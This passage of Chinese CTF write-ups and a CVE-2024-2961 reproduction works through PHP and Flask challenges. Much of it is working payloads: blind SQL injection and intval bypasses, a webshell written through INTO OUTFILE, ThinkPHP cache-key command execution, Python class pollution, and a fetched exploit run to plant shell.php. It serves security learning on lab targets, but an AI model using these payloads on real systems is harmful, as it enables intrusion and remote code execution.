$numPositve >= 999999999999999999) { //在64位系统中 intval()的上限不是2147483647 省省吧\n        die(\"非洲欢迎你2\");\n    }\n    if( $numPositve === $numReverse && !isPalindrome($num) ){\n        echo \"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.</br>\";\n    }else{\n        die(\"金钱解决不了穷人的本质问题\");\n    }\n}else{\n    die(\"去非洲吧\");\n}\n```\n\n试了一下八进制也绕不了，num进入isPalindrome的时候是八进制转化成十进制的数\n\n本地测了一下浮点数可以绕，加个0就可以绕过函数的检查了\n\n```php\n<?php\n$num = 1.10;\n$numPositve = intval($num);\n$numReverse = intval(strrev($num));\necho $numPositve;\necho $numReverse;\nif ($numPositve===$numReverse){\n    echo 'yes';\n}\n//11yes\n```\n\n但是我发现我的php对传入的num=1.10在传入isPalindrome的时候会变成1.1，但是题目中不会\n\npayload\n\n```\n -0, 0- , 1.10 , 0. , .0 ,0.00\n```\n\n### level 2\n\n```php\n<?php\nif (isset($_GET['md5'])){\n    $md5=$_GET['md5'];\n    if ($md5==md5(md5($md5)))\n        echo \"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.</br>\";\n    else\n        die(\"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲\");\n}else{\n    die(\"去非洲吧\");\n}\n```\n\n双重md5弱比较绕过，直接爆破就行\n\n```php\nimport hashlib\n\nfor i in range(0,1000000000000):\n    data = \"0e\"+str(i)\n    md5 = hashlib.md5(data.encode('utf-8')).hexdigest()\n    md52 = hashlib.md5(str(md5).encode('utf-8')).hexdigest()\n    if md52[0:2] == '0e' and md52[2:].isnumeric():\n        print(data+\": \"+md52)\n```\n\n```\n&md5=0e1138100474\n```\n\n### level 3\n\n```php\n//get flag\nif (isset($_GET['get_flag'])){\n    $get_flag = $_GET['get_flag'];\n    if(!strstr($get_flag,\" \")){\n        $get_flag = str_ireplace(\"cat\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"more\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"tail\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"less\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"head\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"tac\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"$\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"sort\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"curl\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"nc\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"bash\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"php\", \"36dCTFShow\", $get_flag);\n        echo \"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.</br>\";\n        system($get_flag);\n    }else{\n        die(\"快到非洲了\");\n    }\n}else{\n    die(\"去非洲吧\");\n}\n```\n\n空格过滤拿%09去绕过\n\n```\nget_flag=ls%09/\nget_flag=nl%09/*\n```\n\n之前做过一个nl的特性，直接把根目录下的flag的内容爆出来了\n\n![image-20250516133116761](../image/achieve/202411/36D杯+练手赛/image-20250516133116761.png)\n\n## WUSTCTF\\_朴实无华_Revenge_Revenge\n\n挨个看\n\n### level 1\n\n```php\nfunction isPalindrome($str){\n    $len=strlen($str);\n    $l=1;\n    $k=intval($len/2)+1;\n    for($j=0;$j<$k;$j++)\n        if (substr($str,$j,1)!=substr($str,$len-$j-1,1)) {\n            $l=0;\n            break;\n        }\n    if ($l==1) return true;\n    else return false;\n}\n//level 1\nif (isset($_GET['num'])){\n    $num = $_GET['num'];\n    $numPositve = intval($num);\n    $numReverse = intval(strrev($num));\n    if (preg_match('/[^0-9.]/', $num)) {\n        die(\"非洲欢迎你1\");\n    } else {\n        if ( (preg_match_all(\"/\\./\", $num) > 1) || (preg_match_all(\"/\\-/\", $num) > 1) || (preg_match_all(\"/\\-/\", $num)==1 && !preg_match('/^[-]/', $num))) {\n            die(\"没有这样的数\");\n        }\n    }\n    if ($num != $numPositve) {\n        die('最开始上题时候忘写了这个，导致这level 1变成了弱智，怪不得这么多人solve');\n    }\n\n    if ($numPositve <= -999999999999999999 || $numPositve >= 999999999999999999) { //在64位系统中 intval()的上限不是2147483647 省省吧\n        die(\"非洲欢迎你2\");\n    }\n    if( $numPositve === $numReverse && !isPalindrome($num) ){\n        echo \"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.</br>\";\n    }else{\n        die(\"金钱解决不了穷人的本质问题\");\n    }\n}else{\n    die(\"去非洲吧\");\n}\n```\n\n这次不能用-号了，并且转化成整数后的数要等于原数据，那就用0.00吧\n\n```\n?num=0.00\n```\n\n### level 2\n\n没啥变化，之前的也可以打\n\n```\n&md5=0e1138100474\n```\n\n### level 3\n\n```php\n//get flag\nif (isset($_GET['get_flag'])){\n    $get_flag = $_GET['get_flag'];\n    if(!strstr($get_flag,\" \")){\n        $get_flag = str_ireplace(\"cat\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"more\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"tail\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"less\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"head\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"tac\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"sort\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"nl\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"$\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"curl\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"bash\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"nc\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"php\", \"36dCTFShow\", $get_flag);\n        if (preg_match(\"/['\\*\\\"[?]/\", $get_flag)) {\n            die('非预期修复*2');\n        }\n        echo \"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.</br>\";\n        system($get_flag);\n    }else{\n        die(\"快到非洲了\");\n    }\n```\n\n过滤了之前nl的做法，那我们反斜杠绕过关键字就行\n\n```\n&get_flag=ta\\c%09flag.ph\\p\n```\n\n## Login_Only_For_36D\n\n### #时间盲注\n\n![image-20241219202259005](./../image/achieve/202411/ctfshow--web专题/image-20241219202259005.png)\n\n登录界面，我们先输入两个1看看\n\n![image-20241219202330531](./../image/achieve/202411/ctfshow--web专题/image-20241219202330531.png)\n\n试一下admin'和1，回显hacker，应该是`'`单引号被过滤了，那就测试一下，发现空格，等于号，and，or，ascii，substr，select，union都被过滤了，sleep，ord，#，if没被过滤，那我们考虑一下时间盲注\n\n猜测一下查询语句\n\n```\n查询语句\n<!-- if (!preg_match('/admin/', $uname)) die; -->\n<!-- select * from 36d_user where username='$uname' and password='$passwd'; -->\n```\n\n过滤了引号，但是还有注释符可用，可以用\\将单引号转义\n\npayload\n\n```\nusername=admin\\&password=or(sleep(5))#\n```\n\n`admin\\`把单引号注释掉让后面$passwd逃逸出去，然后可以发现延迟了5s，确认存在时间盲注，那我们上脚本，因为我们知道了账号是admin，所以我们打password就可以了\n\n```python\nimport requests\nimport time\nimport datetime\n\n\nurl = \"http://fcc116b3-6180-4c33-8def-a29981cbe059.challenge.ctf.show/index.php\"\n\ndict = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\"\n\nresult = \"\"\nfor i in range(0,100):\n    for char in dict:\n        data={\n            \"username\" : \"admin\\\\\",\n            \"password\" : \"\"\n        }\n        payload = 'or/**/if((password/**/regexp/**/binary/**/\"^{}\"),sleep(5),1)#'.format(result+char)\n        data['password'] = payload\n        time1 = datetime.datetime.now()\n        response = requests.post(url, data=data)\n        time2 = datetime.datetime.now()\n        sec = (time2 - time1).seconds\n        if sec >= 5:#超时时间为5秒\n            result += char\n            print(result)\n            break\n\n```\n\n解释一下payload哈\n\n### regexp binary正则匹配\n\n空格用`/**/`去绕过，然后`password regexp binary \"^{}\"` 是一个正则表达式匹配操作，它尝试匹配数据库中的 password 字段的值是否与指定的模式 `^{}(任意字符)` 匹配。\n\n![image-20241219225610042](./../image/achieve/202411/ctfshow--web专题/image-20241219225610042.png)\n\n这个就是我们的password\n\n## 你取吧\n\n### #自增无字母RCE\n\n代码审计题目\n\n```php\n<?php\nerror_reporting(0);\nshow_source(__FILE__);\n$hint=file_get_contents('php://filter/read=convert.base64-encode/resource=hhh.php');\n$code=$_REQUEST['code'];\n$_=array('a','b','c','d','e','f','g','h','i','j','k','m','n','l','o','p','q','r','s','t','u','v','w','x','y','z','\\~','\\^');\n$blacklist = array_merge($_);\nforeach ($blacklist as $blacklisted) {\n    if (preg_match ('/' . $blacklisted . '/im', $code)) {\n        die('nonono');\n    }\n}\neval(\"echo($code);\");\n?>\n```\n\n无字母无数字rce，这里把取反和异或符号都去掉了，显而易见这里可以用自增去进行rce\n\n那就写呗\n\n```php\n<?php\n$_=[];\n$_=@\"$_\";\n$_=$_['!'=='@'];\n$___=$_;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;\n$___.=$__;\n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;\n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;\n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;\n$___.=$__;\n$____='_';\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;\n$____.=$__;\n$_=$$____;\n$___($_[_]);\necho $_.\"\\n\";\necho $____.\"\\n\";\n/*ASSERT\n_POST\n$_POST\n*/\n```\n\n也可以用`$_`数组进行变量拼接\n\n```\n?code=`$_[12]$_[13] /*`  --> `nl /*`\n?code=`$_[12]$_[13] /$_[5]$_[13]$_[0]$_[6]`  --> `nl /flag`\n?code=1);$__=$_[18].$_[24].$_[18].$_[19].$_[4].$_[11];$__(\"$_[12]$_[13] /$_[5]$_[13]$_[0]$_[6]\");(1  --> 1);system(\"nl /flag\");(1\n```\n\n## 你没见过的注入\n\n### #finfo文件注入\n\n访问robots.txt拿到/pwdreset.php，重置密码后登录admin账户\n\n文件上传\n\n```\nPOST /upload.php HTTP/1.1\nHost: 64a7c934-f07a-4c12-b004-51026198fba1.challenge.ctf.show\nConnection: keep-alive\nContent-Length: 297\nCache-Control: max-age=0\nsec-ch-ua: \"Chromium\";v=\"136\", \"Google Chrome\";v=\"136\", \"Not.A/Brand\";v=\"99\"\nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"Windows\"\nOrigin: https://64a7c934-f07a-4c12-b004-51026198fba1.challenge.ctf.show\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryFoKgAPnn4CStanW0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://64a7c934-f07a-4c12-b004-51026198fba1.challenge.ctf.show/main.php\nAccept-Encoding: gzip, deflate, br, zstd\nAccept-Language: zh-CN,zh;q=0.9\nCookie: cf_clearance=ZuK66QChNGftyyiGS39xGqXjRvrgqwc7dpOpwNp8hgY-1747317016-1.2.1.1-SHtYMtmhonoQh3f9JFLxlX5e8ZPl2H.d.1t6d9JUkU8A48zWJ8kwl3L9eAExpcFayYenFfR8OxZ7NWlafUA3eW..1Ql.yEeMVQsO2dN0LeOWb9v9mBTw9f9lNiJBsuz0wNfBuxQoVypAzPhH9KeUpkB22hemlwS35.DR.pfloutzMUBCc7K.SMPWBv0hD22WPrXL6TOwx.8Vlv0exiJGfJydMDF8Fmgi7BwFDHfm8A27bqv1xzCh1xdEneeUo.dok_1cBQWYDpbP2ClHu0miDKBW2hnvhGXG7HbMovGYSE3c1QFXa0TPiCQYSEXDX_10Bnlxz9QrXZujCxO7ZGcQA_vDxzoYodJRpDZrLpAsbq8; PHPSESSID=pshlu9hjnvd3t669rp84ggf97l\n\n------WebKitFormBoundaryFoKgAPnn4CStanW0\nContent-Disposition: form-data; name=\"file\"; filename=\"1.txt\"\nContent-Type: text/plain\n\n<?php phpinfo(); ?>\n------WebKitFormBoundaryFoKgAPnn4CStanW0\nContent-Disposition: form-data; name=\"submit\"\n\nSubmit\n------WebKitFormBoundaryFoKgAPnn4CStanW0--\n\n```\n\n上传后在filelist.php页面查看文件，发现这里很像之前web224做的一个finfo的文件注入，所以我们传入\n\n```\nC64File\"');select 0x3c3f3d60245f4745545b315d603f3e into outfile '/var/www/html/1.php';--+\n0x3c3f3d60245f4745545b315d603f3e是<?=`$_GET[1]`?>的十六进制\n```\n\n上传后访问1.php并进行RCE就行\n\n看upload.php发现果然和之前的那道题是一样的\n","tags":["36D杯"],"categories":["ctfshow"]},{"title":"CVE-2024-2961漏洞复现","url":"/2025/05/15/CVE-2024-2961漏洞复现/","content":"\n## 漏洞信息\n\n### 0x01漏洞描述\n\n![image-20250515113237505](../image/achieve/202411/CVE复现/image-20250515113237505.png)\n\n其实就是PHP利用glibc iconv()中的一个缓冲区溢出漏洞，实现将文件读取提升为任意命令执行漏洞\n\n什么是缓冲区溢出呢？我看到一个师傅给的解释很详细\n\n[CVE-2024-2961：将phpfilter任意文件读取提升为远程代码执行（RCE）](https://blog.csdn.net/web22050702/article/details/139502051)\n\n缓冲区溢出是二进制安全研究领域里很常见的漏洞。所谓缓冲区溢出是指当一段程序尝试把更多的数据放入一个缓冲区，数据超出了缓冲区本身的容量，导致数据溢出到被分配空间之外的内存空间，使得溢出的数据覆盖了其他内存空间的数据。攻击者可以利用缓冲区溢出修改计算机的内存，破坏或控制程序的执行，导致数据损坏、程序崩溃，甚至是恶意代码的执行。缓冲区溢出攻击又分为栈溢出、堆溢出、格式字符串溢出、整数溢出、Unicode溢出。\n\n### 0x02利用场景\n\n漏洞的利用场景\nPHP的所有标准文件读取操作都受到了影响：`file_get_contents()`、`file()`、`readfile()`、`fgets()`、`getimagesize()`、`SplFileObject->read()`等。文件写入操作同样受到影响（如file_put_contents()及其同类函数）.\n\n其他利用场景; 其他文件读写相关操作只要支持php://filter伪协议都可以利用。包括`XXE、new $_GET['cls']($_GET['argument']);`这种场景，都可以使用这个trick进行利用\n\n所以我们可以在php读取文件的时候可以使用 php://filter伪协议利用 iconv 函数, 从而可以利用该漏洞进行 RCE，将phpfilter任意文件读取提升为远程代码执行\n\n## 漏洞浮现\n\nvulhub的靶场刚好有这个漏洞\n\ngithub地址:https://github.com/vulhub/vulhub/tree/master/php/CVE-2024-2961\n\n但是起环境之后会有一个错误，我们看一下源码\n\n![image-20250515113841859](../image/achieve/202411/CVE复现/image-20250515113841859.png)\n\n这里的话因为一开始每传入file参数所以造成了报错，稍微改一下吧，虽然这个影响不大\n\n```php\n<?php\nhighlight_file(__FILE__);\nif(isset($_POST['file'])){ \n    $data = file_get_contents($_POST['file']);\n    echo \"File contents: $data\";\n}\n```\n\n但是一直没访问成功，算了，自己本地搭一个吧，反正也很简单\n\n![image-20250515115515339](../image/achieve/202411/CVE复现/image-20250515115515339.png)\n\n可以发现是可以进行读取文件的, 接下来就是尝试进行RCE的利用了\n\n安装一下环境依赖\n\n```\npip install pwntools\npip install https://github.com/cfreal/ten/archive/refs/heads/main.zip\n```\n\n下载poc\n\n```\nwget https://raw.githubusercontent.com/ambionics/cnext-exploits/main/cnext-exploit.py\n```\n\n然后我们传入漏洞网站相应的路由就行\n\n```\npython3 cnext-exploit.py http://ip:8080/index.php \"echo '<?php phpinfo();?>' > shell.php\"\n```\n\n\n\n","tags":["漏洞复现"],"categories":["CVE"]},{"title":"ctfshow西瓜杯","url":"/2025/05/14/ctfshow西瓜杯/","content":"\n# CodeInject\n\n```php\n<?php\n\n#Author: h1xa\n\nerror_reporting(0);\nshow_source(__FILE__);\n\neval(\"var_dump((Object)$_POST[1]);\");\n```\n\n这里的话会将传入的内容转化成对象，这里的话尝试闭合就行\n\n```\n1=1);phpinfo();#\n```\n\n![image-20250430203606031](../image/achieve/202411/西瓜杯/image-20250430203606031.png)\n\n```\n1=1);system(\"cat /000f1ag.txt\");#\n```\n\n# tpdoor\n\n页面提示缓存被禁用\n\n这图标是tp的，先审一下源码吧\n\n```php\n<?php\n\nnamespace app\\controller;\n\nuse app\\BaseController;\nuse think\\facade\\Db;\n\nclass Index extends BaseController\n{\n    protected $middleware = ['think\\middleware\\AllowCrossDomain','think\\middleware\\CheckRequestCache','think\\middleware\\LoadLangPack','think\\middleware\\SessionInit'];\n    public function index($isCache = false , $cacheTime = 3600)\n    {\n        \n        if($isCache == true){\n            $config = require  __DIR__.'/../../config/route.php';\n            $config['request_cache_key'] = $isCache;\n            $config['request_cache_expire'] = intval($cacheTime);\n            $config['request_cache_except'] = [];\n            file_put_contents(__DIR__.'/../../config/route.php', '<?php return '. var_export($config, true). ';');\n            return 'cache is enabled';\n        }else{\n            return 'Welcome ,cache is disabled';\n        }\n    }\n\n\n\n}\n```\n\n说实话这个源码给的不全，得自己去翻官方手册了\n\nCheckRequestCache是thinkphp框架中的一个中间件，负责处理请求缓存的，主要功能是在用户请求时检查是否有可用的缓存，如果缓存可用则直接返回缓存内容，从而避免重新处理请求，提升性能。\n\n![image-20250514111846342](../image/achieve/202411/西瓜杯/image-20250514111846342.png)\n\n然后我们看下有请求缓存\n\n![image-20250514112350496](../image/achieve/202411/西瓜杯/image-20250514112350496.png)\n\n可以看到在源码中我们的参数$isCache = false，也就是说此时是关闭请求缓存的\n\n先报错看一下tp的版本\n\n![image-20250514113127518](../image/achieve/202411/西瓜杯/image-20250514113127518.png)\n\n然后我们把源码下下来看下\n\n![image-20250514114157907](../image/achieve/202411/西瓜杯/image-20250514114157907.png)\n\n然后我们发现\n\n![image-20250514114312466](../image/achieve/202411/西瓜杯/image-20250514114312466.png)\n\n这里的话getRequestCache会返回request_cache_key,我们跟进一下这个方法的使用\n\n![image-20250514114429397](../image/achieve/202411/西瓜杯/image-20250514114429397.png)\n\n这里可以看到，在将`$cache`赋值后，key会传入parseCacheKey函数中刷新key\n\n```php\nprotected function parseCacheKey($request, $key)\n    {\n        if ($key instanceof Closure) {\n            $key = call_user_func($key, $request);\n        }\n\n        if (false === $key) {\n            // 关闭当前缓存\n            return;\n        }\n\n        if (true === $key) {\n            // 自动缓存功能\n            $key = '__URL__';\n        } elseif (str_contains($key, '|')) {\n            [$key, $fun] = explode('|', $key);\n        }\n\n        // 特殊规则替换\n        if (str_contains($key, '__')) {\n            $key = str_replace(['__CONTROLLER__', '__ACTION__', '__URL__'], [$request->controller(), $request->action(), md5($request->url(true))], $key);\n        }\n\n        if (str_contains($key, ':')) {\n            $param = $request->param();\n\n            foreach ($param as $item => $val) {\n                if (is_string($val) && str_contains($key, ':' . $item)) {\n                    $key = str_replace(':' . $item, (string) $val, $key);\n                }\n            }\n        } elseif (str_contains($key, ']')) {\n            if ('[' . $request->ext() . ']' == $key) {\n                // 缓存某个后缀的请求\n                $key = md5($request->url());\n            } else {\n                return;\n            }\n        }\n\n        if (isset($fun)) {\n            $key = $fun($key);\n        }\n\n        return $key;\n    }\n}\n\n```\n\n仔细看可以发现两个关键点\n\n```php\nif (true === $key) {\n            // 自动缓存功能\n            $key = '__URL__';\n        } elseif (str_contains($key, '|')) {\n            [$key, $fun] = explode('|', $key);\n        }\n```\n\n这里的话只要key中有管道符`|`，那么就会以`|`为分隔符将key分为key和fun两部分\n\n```php\nif (isset($fun)) {\n            $key = $fun($key);\n        }\n```\n\n然后这里的话会调用`$fun($key)`函数,所以如果key可控，我们就可以实现任意代码执行\n\n我们看看key是怎么来的\n\n![image-20250514115501143](../image/achieve/202411/西瓜杯/image-20250514115501143.png)\n\n`$key`是从`$config['request_cache_key']`中获取的，我们返回来看题\n\n```php\nif($isCache == true){\n            $config = require  __DIR__.'/../../config/route.php';\n            $config['request_cache_key'] = $isCache;\n            $config['request_cache_expire'] = intval($cacheTime);\n            $config['request_cache_except'] = [];\n            file_put_contents(__DIR__.'/../../config/route.php', '<?php return '. var_export($config, true). ';');\n            return 'cache is enabled';\n```\n\n因为这里isCache是弱比较，所以我们可以传参`isCache`给../../config/route.php写入`$config['request_cache_key']`\n\npayload\n\n```\n?isCache=ls|system\n```\n\n然后访问根目录发现并没变化，想起index.php有个缓存时间，看到有师傅说将cacheTime设置为3\n\n```\n?isCache=ls%20/|system&cacheTime=3\n```\n\n但是我设置之后并没成功，可能环境不一样吧，我只能重新开个靶场了\n\n```\n?isCache=cat%20/000*|system\n```\n\n# easy_polluted\n\n先看看源码吧\n\n```python\nfrom flask import Flask, session, redirect, url_for,request,render_template\nimport os\nimport hashlib\nimport json\nimport re\ndef generate_random_md5():\n    random_string = os.urandom(16)\n    md5_hash = hashlib.md5(random_string)\n\n    return md5_hash.hexdigest()\ndef filter(user_input):\n    blacklisted_patterns = ['init', 'global', 'env', 'app', '_', 'string']\n    for pattern in blacklisted_patterns:\n        if re.search(pattern, user_input, re.IGNORECASE):\n            return True\n    return False\ndef merge(src, dst):\n    # Recursive merge function\n    for k, v in src.items():\n        if hasattr(dst, '__getitem__'):\n            if dst.get(k) and type(v) == dict:\n                merge(v, dst.get(k))\n            else:\n                dst[k] = v\n        elif hasattr(dst, k) and type(v) == dict:\n            merge(v, getattr(dst, k))\n        else:\n            setattr(dst, k, v)\n\n\napp = Flask(__name__)\napp.secret_key = generate_random_md5()\n\nclass evil():\n    def __init__(self):\n        pass\n\n@app.route('/',methods=['POST'])\ndef index():\n    username = request.form.get('username')\n    password = request.form.get('password')\n    session[\"username\"] = username\n    session[\"password\"] = password\n    Evil = evil()\n    if request.data:\n        if filter(str(request.data)):\n            return \"NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~\"\n        else:\n            merge(json.loads(request.data), Evil)\n            return \"MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED\"\n    return render_template(\"index.html\")\n\n@app.route('/admin',methods=['POST', 'GET'])\ndef templates():\n    username = session.get(\"username\", None)\n    password = session.get(\"password\", None)\n    if username and password:\n        if username == \"adminer\" and password == app.secret_key:\n            return render_template(\"flag.html\", flag=open(\"/flag\", \"rt\").read())\n        else:\n            return \"Unauthorized\"\n    else:\n        return f'Hello,  This is the POLLUTED page.'\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)\n\n```\n\n分成几部分去分析一下\n\n```python\ndef generate_random_md5():\n    random_string = os.urandom(16)\n    md5_hash = hashlib.md5(random_string)\n\n    return md5_hash.hexdigest()\n```\n\n生成一个16字节的随机字节串，并进行md5哈希计算，并将哈希值转化成16进制字符串后返回\n\n```python\ndef filter(user_input):\n    blacklisted_patterns = ['init', 'global', 'env', 'app', '_', 'string']\n    for pattern in blacklisted_patterns:\n        if re.search(pattern, user_input, re.IGNORECASE):\n            return True\n    return False\n```\n\n一个过滤器，匹配黑名单的字符，匹配到则返回true，否则返回False\n\n```python\ndef merge(src, dst):\n    # Recursive merge function\n    for k, v in src.items():\n        if hasattr(dst, '__getitem__'):\n            if dst.get(k) and type(v) == dict:\n                merge(v, dst.get(k))\n            else:\n                dst[k] = v\n        elif hasattr(dst, k) and type(v) == dict:\n            merge(v, getattr(dst, k))\n        else:\n            setattr(dst, k, v)\n```\n\n就是merge函数，也是污染的关键点\n\n```python\napp.secret_key = generate_random_md5()\n#随机生成key\n```\n\n```python\nclass evil():\n    def __init__(self):\n        pass\n```\n\n设置一个evil类和构造方法`__init__`\n\n```python\n@app.route('/',methods=['POST'])\ndef index():\n    username = request.form.get('username')\n    password = request.form.get('password')\n    session[\"username\"] = username\n    session[\"password\"] = password\n    Evil = evil()\n    if request.data:\n        if filter(str(request.data)):\n            return \"NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~\"\n        else:\n            merge(json.loads(request.data), Evil)\n            return \"MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED\"\n    return render_template(\"index.html\")\n```\n\npost获取username和password两参数，并设为session，之后对传入的原始数据进行一个filter过滤，若返回true则返回过滤提示，否则进行渲染返回index.html\n\n```python\n@app.route('/admin',methods=['POST', 'GET'])\ndef templates():\n    username = session.get(\"username\", None)\n    password = session.get(\"password\", None)\n    if username and password:\n        if username == \"adminer\" and password == app.secret_key:\n            return render_template(\"flag.html\", flag=open(\"/flag\", \"rt\").read())\n        else:\n            return \"Unauthorized\"\n    else:\n        return f'Hello,  This is the POLLUTED page.'\n```\n\n从session中获取username和password的值，若两者存在且username为adminer，password为key密钥，就返回flag.html渲染的页面并返回flag的内容\n\n其实这里显而易见了，是需要污染key的值，然后我们就可以拿到密码去进行验证，从而拿到flag，看看merge函数的用法\n\n![image-20250514171647455](../image/achieve/202411/西瓜杯/image-20250514171647455.png)\n\n所以我们的payload\n\n```\n{\"__init__\":{\"__globals__\":{\"app\":{\"secret_key\":\"123\"}}}}\n```\n\n本地测试一下\n\n```python\nfrom flask import Flask, session, redirect, url_for,request,render_template\nimport os\nimport hashlib\nimport re\ndef generate_random_md5():\n    random_string = os.urandom(16)\n    md5_hash = hashlib.md5(random_string)\n\n    return md5_hash.hexdigest()\ndef merge(src, dst):\n    # Recursive merge function\n    for k, v in src.items():\n        if hasattr(dst, '__getitem__'):\n            if dst.get(k) and type(v) == dict:\n                merge(v, dst.get(k))\n            else:\n                dst[k] = v\n        elif hasattr(dst, k) and type(v) == dict:\n            merge(v, getattr(dst, k))\n        else:\n            setattr(dst, k, v)\napp = Flask(__name__)\napp.secret_key = generate_random_md5()\n\nclass evil():\n    def __init__(self):\n        pass\npayload = {\n    \"__init__\" :\n        {\n            \"__globals__\" :\n                {\n                    \"app\" :\n                        {\n                            \"secret_key\" : \"123\"\n                        }\n                }\n        }\n}\nEvil = evil()\nmerge(payload, Evil)\nprint(app.secret_key)\n```\n\n但是有黑名单过滤，因为这里有json.loads，我们用unicode编码去绕过\n\n本地测试一下\n\n```python\nimport json\ndata = '{\"word\":\"hello \\u0077\\u006f\\u0072\\u006c\\u0064\"}'\ndata_plus = json.loads(data)\nprint(data_plus)\n#{'word': 'hello world'}\n```\n\n发现unicode编码在load之后也会进行解码\n\n那我们正常打就行\n\npayload\n\n```\n{\"\\u005f\\u005f\\u0069\\u006e\\u0069\\u0074\\u005f\\u005f\":{\"\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f\":{\"\\u0061\\u0070\\u0070\":{\"\\u0073\\u0065\\u0063\\u0072\\u0065\\u0074\\u005f\\u006b\\u0065\\u0079\":\"123456\"}}}}\n```\n\n发包\n\n![image-20250514174057353](../image/achieve/202411/西瓜杯/image-20250514174057353.png)\n\n然后我们post传入\n\n```\nusername=adminer&password=123\n```\n\n之后返回session\n\n```\nsession=eyJwYXNzd29yZCI6IjEyMyIsInVzZXJuYW1lIjoiYWRtaW5lciJ9.aCRlpw.2IVc7AGVg1ZBHbqs10Pqyks7MUs\n```\n\n访问/admin路由设置session\n\n![image-20250514174452431](../image/achieve/202411/西瓜杯/image-20250514174452431.png)\n\n但是发现好像没有flag\n\n这里的话是需要输出flag，但是`[##]`不是常规语法标识符\n\n但是我们这里的话是可以自定义标识符的\n\n![image-20250514174945781](../image/achieve/202411/西瓜杯/image-20250514174945781.png)\n\n*variable_start_string*和*variable_end_string*表示变量的开始和结束标识符，例如`{{`和`}}`，所以这里我们需要污染这个属性的值和key\n\npayload\n\n```python\npayload={\n    \"__init__\":{\n        \"__globals__\":{\n            \"app\":{\n                \"secret_key\":\"12345\",\n                \"jinja_env\":{\n                    \"variable_start_string\":\"[#\",\n                    \"variable_end_string\":\"#]\"\n                }\n            }\n        }\n    }\n}\n\n\n```\n\n编码一下\n\n```\npayload={\n    \"\\u005F\\u005F\\u0069\\u006E\\u0069\\u0074\\u005F\\u005F\":{\n        \"\\u005F\\u005F\\u0067\\u006C\\u006F\\u0062\\u0061\\u006C\\u0073\\u005F\\u005F\":{\n            \"\\u0061\\u0070\\u0070\":{\n                \"\\u0073\\u0065\\u0063\\u0072\\u0065\\u0074\\u005f\\u006b\\u0065\\u0079\":\"12345\",\n                